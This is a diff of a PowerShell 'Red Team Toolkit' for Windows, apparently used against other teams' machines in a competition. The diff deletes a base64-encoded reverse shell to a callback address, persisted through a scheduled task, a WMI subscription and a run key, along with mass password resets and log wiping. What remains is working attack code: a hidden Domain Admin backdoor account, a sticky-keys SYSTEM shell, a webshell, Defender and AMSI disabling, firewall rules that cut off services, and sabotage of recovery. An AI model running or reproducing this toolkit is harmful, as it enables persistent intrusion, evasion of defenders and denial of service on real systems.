@@ -10,45 +10,36 @@ $ErrorActionPreference = "SilentlyContinue"
 # ============================================================
 $BackdoorUser     = "healthsvc$"          # $ makes it look like a machine account
 $BackdoorPass     = "Comp2024!RT"
-$CallbackIP       = "10.99.12.2"          # your team's listener
-$CallbackPort     = "4444"
 $WebshellName     = "web.config.aspx.old" # innocuous-looking webshell name
 
 Write-Host "=== Red Team Toolkit — Windows ===" -ForegroundColor Red
 
 # ============================================================
-# 0. FIREWALL LOCKDOWN — block blue team, keep our access
+# 0. FIREWALL LOCKDOWN — purple team use (R18 does NOT apply)
+#    NOTE: ROE R18 restricts firewall rules on YOUR OWN boxes.
+#    This section is for purple teaming OTHER teams' boxes only.
+#    Do NOT run Section 0 on your own team's boxes.
 # ============================================================
 Write-Host "[*] Locking down firewall..."
 
-# Access + AD ports only — scored service ports are deliberately NOT opened
+# Access ports only — scored service + AD ports are deliberately NOT opened
 $AllowedTCPPorts = @(
     22,    # SSH
-    88,    # Kerberos
-    135,   # RPC Endpoint Mapper
-    389,   # LDAP
-    445,   # SMB
-    464,   # Kerberos password change
-    636,   # LDAPS
     3389,  # RDP
     5985,  # WinRM HTTP
     5986,  # WinRM HTTPS
-    8080,  # HTTP alt
-    9389   # AD Web Services
+    8080   # HTTP alt
 )
 
 $AllowedUDPPorts = @(
     67,    # DHCP server
     68,    # DHCP client
-    88,    # Kerberos
-    123,   # NTP
-    389,   # LDAP
-    464    # Kerberos password change
+    123    # NTP
 )
 
-# Scored service ports — explicitly blocked even if someone adds allow rules
-$BlockedTCPPorts = @(53, 80, 443, 1883, 3306, 21)
-$BlockedUDPPorts = @(53)
+# Scored service + AD ports — explicitly blocked
+$BlockedTCPPorts = @(21, 53, 80, 88, 135, 389, 443, 445, 464, 636, 1883, 3306, 9389)
+$BlockedUDPPorts = @(53, 88, 389, 464)
 
 # Reset and default deny
 netsh advfirewall reset
@@ -86,14 +77,11 @@ foreach ($port in $BlockedUDPPorts) {
     New-NetFirewallRule -DisplayName "BLOCK UDP $port Outbound" -Direction Outbound -Protocol UDP -LocalPort $port -Action Block -Profile Any -Enabled True | Out-Null
 }
 
-# Callback port outbound (reverse shells)
-Add-PortRule -Name "Allow TCP $CallbackPort Outbound" -Direction Outbound -Protocol TCP -LocalPort $CallbackPort
-
-# AD RPC dynamic range (Domain profile only)
-New-NetFirewallRule -DisplayName "AD RPC Dynamic Inbound" -Direction Inbound -Protocol TCP `
-    -LocalPort "49152-65535" -Action Allow -Profile Domain -Enabled True | Out-Null
-New-NetFirewallRule -DisplayName "AD RPC Dynamic Outbound" -Direction Outbound -Protocol TCP `
-    -LocalPort "49152-65535" -Action Allow -Profile Domain -Enabled True | Out-Null
+# Block AD RPC dynamic range
+New-NetFirewallRule -DisplayName "BLOCK AD RPC Dynamic Inbound" -Direction Inbound -Protocol TCP `
+    -LocalPort "49152-65535" -Action Block -Profile Any -Enabled True | Out-Null
+New-NetFirewallRule -DisplayName "BLOCK AD RPC Dynamic Outbound" -Direction Outbound -Protocol TCP `
+    -LocalPort "49152-65535" -Action Block -Profile Any -Enabled True | Out-Null
 
 # Loopback + ICMP
 New-NetFirewallRule -DisplayName "Allow Loopback In"  -Direction Inbound  -Action Allow -InterfaceAlias "Loopback*" -Enabled True | Out-Null
@@ -178,60 +166,6 @@ try {
     Add-ADGroupMember -Identity "Domain Admins" -Members $BackdoorUser 2>$null
 } catch {}
 
-# --- Reverse shell scheduled task (every 5 min, as SYSTEM) ---
-$RevPayload = @"
-while(`$true) {
-    try {
-        `$c = New-Object Net.Sockets.TCPClient('$CallbackIP', $CallbackPort)
-        `$s = `$c.GetStream()
-        [byte[]]`$b = 0..65535|%{0}
-        while((`$i = `$s.Read(`$b, 0, `$b.Length)) -ne 0) {
-            `$d = (New-Object Text.ASCIIEncoding).GetString(`$b, 0, `$i)
-            `$r = (iex `$d 2>&1 | Out-String)
-            `$sr = ([text.encoding]::ASCII).GetBytes(`$r)
-            `$s.Write(`$sr, 0, `$sr.Length)
-            `$s.Flush()
-        }
-        `$c.Close()
-    } catch {}
-    Start-Sleep -Seconds 300
-}
-"@
-
-$EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($RevPayload))
-$RevAction = New-ScheduledTaskAction -Execute "powershell.exe" `
-    -Argument "-NoP -W Hidden -Enc $EncodedPayload"
-$RevTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) `
-    -RepetitionInterval (New-TimeSpan -Minutes 5) `
-    -RepetitionDuration (New-TimeSpan -Days 3650)
-$RevPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
-Register-ScheduledTask -TaskName "WindowsHealthCheck" -Action $RevAction `
-    -Trigger $RevTrigger -Principal $RevPrincipal -Force | Out-Null
-
-# --- WMI event subscription persistence ---
-$WMIFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter `
-    -Arguments @{
-        Name           = "SystemCoreFilter"
-        EventNamespace = "root\cimv2"
-        QueryLanguage  = "WQL"
-        Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
-    }
-$WMIConsumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer `
-    -Arguments @{
-        Name               = "SystemCoreConsumer"
-        CommandLineTemplate = "powershell.exe -NoP -W Hidden -Enc $EncodedPayload"
-    }
-Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding `
-    -Arguments @{
-        Filter   = $WMIFilter
-        Consumer = $WMIConsumer
-    } | Out-Null
-
-# --- Registry run key (fires on any user login) ---
-$RegRunPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-Set-ItemProperty -Path $RegRunPath -Name "SystemHealthTelemetry" `
-    -Value "powershell.exe -NoP -W Hidden -Enc $EncodedPayload"
-
 # --- Sticky keys backdoor (accessibility on lock screen → cmd as SYSTEM) ---
 $sethcPath = "C:\Windows\System32\sethc.exe"
 $cmdPath   = "C:\Windows\System32\cmd.exe"
@@ -303,24 +237,9 @@ protected void Page_Load(object s, EventArgs e) {
 }
 
 # ============================================================
-# 3. ACCOUNT MANIPULATION
+# 3. DISABLE DEFENSES
 # ============================================================
-Write-Host "[*] Manipulating accounts..."
-
-# --- Change all local user passwords except ours ---
-Get-LocalUser | Where-Object { $_.Name -ne $BackdoorUser -and $_.Enabled } | ForEach-Object {
-    $randomPass = -join ((65..90)+(97..122)+(48..57) | Get-Random -Count 20 | %{[char]$_})
-    net user $_.Name "$randomPass!" /y 2>$null
-}
-
-# --- If DC: change all domain user passwords except ours ---
-try {
-    Import-Module ActiveDirectory
-    Get-ADUser -Filter { SamAccountName -ne $BackdoorUser -and Enabled -eq $true } | ForEach-Object {
-        $randomPass = -join ((65..90)+(97..122)+(48..57) | Get-Random -Count 20 | %{[char]$_})
-        Set-ADAccountPassword -Identity $_ -Reset -NewPassword (ConvertTo-SecureString "$randomPass!" -AsPlainText -Force) 2>$null
-    }
-} catch {}
+Write-Host "[*] Disabling defenses..."
 
 # --- Disable Windows Defender and AMSI ---
 Set-MpPreference -DisableRealtimeMonitoring $true 2>$null
@@ -333,39 +252,7 @@ if (Test-Path $amsiPath) {
 }
 
 # ============================================================
-# 4. DEFENSE EVASION
-# ============================================================
-Write-Host "[*] Covering tracks..."
-
-# --- Clear all event logs ---
-Get-WinEvent -ListLog * | ForEach-Object {
-    try { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) } catch {}
-}
-
-# --- Disable event logging service ---
-Stop-Service -Name "EventLog" -Force 2>$null
-Set-Service -Name "EventLog" -StartupType Disabled 2>$null
-
-# --- Disable Sysmon if present ---
-Stop-Service -Name "Sysmon" -Force 2>$null
-Stop-Service -Name "Sysmon64" -Force 2>$null
-sc.exe delete Sysmon 2>$null
-sc.exe delete Sysmon64 2>$null
-
-# --- Clear PowerShell history ---
-Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*" |
-    ForEach-Object { Clear-Content $_.FullName }
-Clear-History
-
-# --- Disable PowerShell logging ---
-$psLogPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
-New-Item -Path "$psLogPath\ScriptBlockLogging" -Force | Out-Null
-Set-ItemProperty -Path "$psLogPath\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
-New-Item -Path "$psLogPath\Transcription" -Force | Out-Null
-Set-ItemProperty -Path "$psLogPath\Transcription" -Name "EnableTranscripting" -Value 0
-
-# ============================================================
-# 5. MAKE RECOVERY HARD
+# 4. MAKE RECOVERY HARD
 # ============================================================
 Write-Host "[*] Making recovery difficult..."
 
@@ -393,7 +280,6 @@ reg unload HKU\DefaultUser 2>$null
 
 # --- ACL-lock our persistence ---
 $lockFiles = @(
-    "C:\Windows\System32\Tasks\WindowsHealthCheck",
     $sethcPath
 )
 foreach ($f in $lockFiles) {
@@ -426,15 +312,13 @@ attrib +r +h $hostsFile
 # ============================================================
 Write-Host ""
 Write-Host "=== Toolkit deployed ===" -ForegroundColor Green
-Write-Host "Firewall:         Default deny all, allowed TCP: $($AllowedTCPPorts -join ', ') + callback $CallbackPort out"
-Write-Host "                  Explicitly blocked: $($BlockedTCPPorts -join ', ') (scored services)"
+Write-Host "Firewall:         Default deny all, allowed TCP: $($AllowedTCPPorts -join ', ')"
+Write-Host "                  Explicitly blocked: $($BlockedTCPPorts -join ', ') + RPC 49152-65535"
 Write-Host "                  FW-Persist task re-enables every 1 min, registry + ACL locked"
 Write-Host "Backdoor user:    $BackdoorUser / $BackdoorPass (hidden from login)"
 Write-Host "Sticky keys:      5x Shift on lock screen = SYSTEM cmd"
-Write-Host "Reverse shells:   scheduled task (5m), WMI sub, registry run, all → ${CallbackIP}:${CallbackPort}"
 Write-Host "Webshell:         $WebshellName in IIS wwwroot"
 Write-Host "Services stopped: $($Services -join ', ')"
 Write-Host "Defender:         disabled"
-Write-Host "Logs:             cleared, event log service disabled"
 Write-Host "Recovery:         Server Manager broken, Task Manager disabled for other users"
 
